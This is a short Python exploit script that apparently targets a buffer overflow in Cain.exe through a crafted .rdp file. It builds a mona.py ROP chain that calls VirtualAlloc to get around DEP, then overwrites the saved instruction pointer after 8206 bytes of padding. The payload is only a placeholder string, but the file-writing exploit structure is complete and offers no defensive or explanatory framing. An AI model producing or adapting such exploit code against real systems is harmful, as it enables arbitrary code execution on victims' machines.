#!/usr/bin/env python
import struct

def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
        0x005c9bca,  # any readable address. (VULN SPECIFIC)
        0x005c9bca,  # POP EAX # RETN [Cain.exe]
        0x1000f16c,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT packet.dll]
        0x0057c01c,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [Cain.exe]
        0x00585f58,  # PUSH EAX # POP ESI # RETN [Cain.exe]
        0x0052c99f,  # POP EBP # RETN [Cain.exe]
        0x00658542,  # & jmp esp [Cain.exe]
        0x00576979,  # POP EBX # RETN [Cain.exe]
        0x00000001,  # 0x00000001-> ebx
        0x005cc47e,  # POP EDX # RETN [Cain.exe]
        0x00001000,  # 0x00001000-> edx
        0x0054c2d9,  # POP ECX # RETN [Cain.exe]
        0x00000040,  # 0x00000040-> ecx
        0x005ac6d5,  # POP EDI # RETN [Cain.exe]
        0x00618da3,  # RETN (ROP NOP) [Cain.exe]
        0x005ce1fc,  # POP EAX # RETN [Cain.exe]
        0x90909090,  # nop
        0x0056e4cc,  # PUSHAD # RETN [Cain.exe]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

payload = "ABCDEFGHIJKLMOPQRSTUVWXYZ"

rop_chain = create_rop_chain()

junk = 'A' * 8206
# overwrite seip with rop chain
seip = rop_chain

xpl = junk + seip + payload

with open('xpl-dep-1_clean.rdp', 'wb') as fd:
    fd.write(xpl)


